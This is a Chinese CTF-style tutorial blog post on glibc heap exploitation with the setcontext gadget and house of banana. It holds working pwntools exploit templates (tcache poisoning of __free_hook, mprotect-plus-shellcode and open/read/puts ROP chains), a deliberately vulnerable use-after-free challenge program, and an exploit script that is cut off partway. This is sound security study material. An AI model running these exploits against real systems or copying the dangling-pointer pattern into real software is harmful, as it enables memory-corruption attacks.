        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>堆题开沙箱，越做越心慌<br><a href="https://r3t2.top/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/">前文</a></p><h2 id="0x01-利用-setcontext"><a href="#0x01-利用-setcontext" class="headerlink" title="0x01 利用 setcontext"></a>0x01 利用 setcontext</h2><p><code>setcontext</code>函数是<code>libc</code>中一个独特的函数，它的功能是传入一个 <code>SigreturnFrame</code> 结构指针，然后根据 <code>SigreturnFrame</code> 的内容设置各种寄存器。 因此从 <code>setcontext+53</code>（不同 libc 偏移可能不同）的位置开始有如下 <code>gadget</code>，即根据 <code>rdi</code> 指向的 <code>SigreturnFrame</code> 结构设置寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//glibc2.27</span><br><span class="line">0x7ffff7852085 &lt;setcontext+53&gt;     mov    rsp, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7ffff785208c &lt;setcontext+60&gt;     mov    rbx, qword ptr [rdi + 0x80]</span><br><span class="line">0x7ffff7852093 &lt;setcontext+67&gt;     mov    rbp, qword ptr [rdi + 0x78]</span><br><span class="line">0x7ffff7852097 &lt;setcontext+71&gt;     mov    r12, qword ptr [rdi + 0x48]</span><br><span class="line">0x7ffff785209b &lt;setcontext+75&gt;     mov    r13, qword ptr [rdi + 0x50]</span><br><span class="line">0x7ffff785209f &lt;setcontext+79&gt;     mov    r14, qword ptr [rdi + 0x58]</span><br><span class="line">0x7ffff78520a3 &lt;setcontext+83&gt;     mov    r15, qword ptr [rdi + 0x60]</span><br><span class="line">0x7ffff78520a7 &lt;setcontext+87&gt;     mov    rcx, qword ptr [rdi + 0xa8]</span><br><span class="line">0x7ffff78520ae &lt;setcontext+94&gt;     push   rcx</span><br><span class="line">0x7ffff78520af &lt;setcontext+95&gt;     mov    rsi, qword ptr [rdi + 0x70]</span><br><span class="line">0x7ffff78520b3 &lt;setcontext+99&gt;     mov    rdx, qword ptr [rdi + 0x88]</span><br><span class="line">0x7ffff78520ba &lt;setcontext+106&gt;    mov    rcx, qword ptr [rdi + 0x98]</span><br><span class="line">0x7ffff78520c1 &lt;setcontext+113&gt;    mov    r8, qword ptr [rdi + 0x28]</span><br><span class="line">0x7ffff78520c5 &lt;setcontext+117&gt;    mov    r9, qword ptr [rdi + 0x30]</span><br><span class="line">0x7ffff78520c9 &lt;setcontext+121&gt;    mov    rdi, qword ptr [rdi + 0x68]</span><br><span class="line">0x7ffff78520cd &lt;setcontext+125&gt;    xor    eax, eax                            EAX =&gt; 0</span><br><span class="line">0x7ffff78520cf &lt;setcontext+127&gt;    ret   </span><br></pre></td></tr></table></figure><p>可能会有疑惑没有对<code>rip</code>的控制，其实这里的<code>push rcx</code>结合上后续的<code>ret</code>就是在给<code>rip</code>赋值<br>以及需要注意的是在<code>glibc2.29</code>及以上，传入的 <code>SigreturnFrame</code> 结构指针不使用<code>rdi</code>，而是改为了<code>rdx</code>，这需要我们寻找到可以控制<code>rdx</code>的<code>gadget</code>。在<code>glibc2.31</code>，偏移从<code>setcontext+53</code>变为了<code>setcontext+61</code><br>一般对<code>setcontext</code>的利用都是在堆攻击中，一般是两个打法：一是直接打<code>ROP</code>，二是利用<code>mprotect</code>再打一个<code>shellcode</code><br>参考其他博客放两个适用于<code>glibc2.27</code>示意模版，具体利用还需调整（直接用<code>SigreturnFrame()</code>适用于简单的不需要布置其他数据的情况）</p><h4 id="template-for-glibc2-27"><a href="#template-for-glibc2-27" class="headerlink" title="template-for-glibc2.27"></a>template-for-glibc2.27</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcache poisoning</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3f8</span>) <span class="comment"># __free_hook</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># setcontext+shellcode</span></span><br><span class="line">payload=p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x10</span>)</span><br><span class="line">payload+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rsi,%d</span></span><br><span class="line"><span class="string">    mov rdx,0x2000</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] &amp; ~<span class="number">0xfff</span>))</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rsp=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">8</span></span><br><span class="line">frame.rip=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">frame.rdi=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] &amp; ~<span class="number">0xfff</span></span><br><span class="line">frame.rsi=<span class="number">0x2000</span></span><br><span class="line">frame.rdx=<span class="number">7</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(frame.__bytes__()),frame.__bytes__())</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这是打<code>shellcode</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">### tcache poisoning</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x3f8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>) <span class="comment"># __free_hook</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line"><span class="comment">### setcontext+rop</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>)</span><br><span class="line"><span class="comment"># read(3,__free_hook+0x108,0x20)</span></span><br><span class="line">payload+=p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)).__next__())</span><br><span class="line">payload+=p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(libc.search(asm(<span class="string">&#x27;pop rsi;ret&#x27;</span>)).__next__())</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x108</span>)</span><br><span class="line">payload+=p64(libc.search(asm(<span class="string">&#x27;pop rdx;ret&#x27;</span>)).__next__())</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># puts(__free_hook+0x108)</span></span><br><span class="line">payload+=p64(libc.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)).__next__())</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x108</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"> </span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line"><span class="comment"># open(&#x27;./flag&#x27;)</span></span><br><span class="line">frame.rdi=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x100</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">frame.rsp=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+<span class="number">0x8</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(frame.__bytes__()),frame.__bytes__())</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>这是打<code>ROP</code><br>值得一提的是，在高版本的<code>house</code>系列攻击中也可以结合<code>setcontext</code>，尽管<code>rdx</code>不好控制，以<code>house of banana</code>为例，其的攻击链中却存在控制<code>rdx</code>的方法</p><h4 id="house-of-banana-orw-up-to-glibc2-29"><a href="#house-of-banana-orw-up-to-glibc2-29" class="headerlink" title="house-of-banana-orw-up-to-glibc2.29"></a>house-of-banana-orw-up-to-glibc2.29</h4><p>在<code>house of banana</code>中，我们劫持<code>fini_array</code>，在这个过程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br></pre></td></tr></table></figure><p>这里每次调用的函数指针都为上一个的地址减<code>8</code>（也就是逆序遍历），直到最后调用函数指针的基地址<code>array</code>，而每一次调用函数指针，其<code>rdx</code>均为上一次调用的函数指针的地址，而在<code>house of banana</code>攻击中，这个函数指针地址都是被我们劫持的堆地址，那么这里的<code>rdx</code>也就变成了我们布置函数的堆地址。（在<code>glibc2.29+</code>有效）</p><p><img src="/images/houseofbanana-rdx.png"></p><p>这样一来，我们布置函数时候，先布置<code>setcontext</code>相关的<code>gadget</code>，再布置一个<code>ret</code>，然后通过<code>l_info[DT_FINI_ARRAYSZ]</code>设置好<code>i</code>为2，那么逆序遍历，先执行<code>ret</code>，执行完后<code>rdx</code>也就被设置成了我们布置这个<code>ret</code>的堆地址，我们在这里布置好<code>sigFrame</code>（其实需要我们根据<code>setcontext+53</code>中控制寄存器所需的偏移来布置数据），接下来执行<code>setcontext+53</code>，那么也就可以实现类似<code>SROP</code>的效果，劫持几乎所有寄存器<br>我们控制<code>rsp</code>指向我们布置<code>ROP_chain</code>的起始地址，控制<code>rcx</code>为<code>ret</code>，这样也就启动了<code>ROP</code>链；这里也可以实现一个类似<code>shellcode</code>中二次读的操作，就是控制<code>rcx</code>为<code>read</code>，控制<code>rsp</code>为读入的起始地址，然后读入一个<code>ROP_chain</code>，<code>read</code>结束返回后也就执行了<code>ROP</code>；又或者是直接设置好寄存器然后控制<code>rcx</code>为<code>open</code>，可以缩短后续的<code>ropchain</code><br><strong>实操一下</strong>，还是用分析<code>hosue of banana</code>时候板子题，只不过编译到<code>glibc2.31</code>，我们起个<code>ubuntu20.04</code>的<code>docker</code>编译一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc pwn.c -o pwn -w -g</span></span><br><span class="line"><span class="comment">//ubuntu 20.04     GLIBC 2.31-0ubuntu9.18</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> num 10</span></span><br><span class="line"><span class="type">void</span> *chunk_list[num];</span><br><span class="line"><span class="type">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1.add&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2.show&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3.edit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4.delete&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index,size;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;size);</span><br><span class="line"><span class="keyword">if</span>(size&lt;<span class="number">0x80</span>||size&gt;<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">chunk_list[index] = <span class="built_in">calloc</span>(size,<span class="number">1</span>);</span><br><span class="line">  chunk_size[index] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,chunk_list[index],chunk_size[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=num)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;context: &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line"><span class="keyword">if</span>(choice==<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">1</span>)&#123;</span><br><span class="line">add();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)&#123;</span><br><span class="line">show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)&#123;</span><br><span class="line">edit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)&#123;</span><br><span class="line">delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6_2.31-0ubuntu9.18_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/libc6-dbg_2.31-0ubuntu9.18_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.18/amd64/glibc-source_2.31-0ubuntu9.18_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;context: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>() :</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;context: \n&#x27;</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span> , <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x1ecb80</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x500</span>)</span><br><span 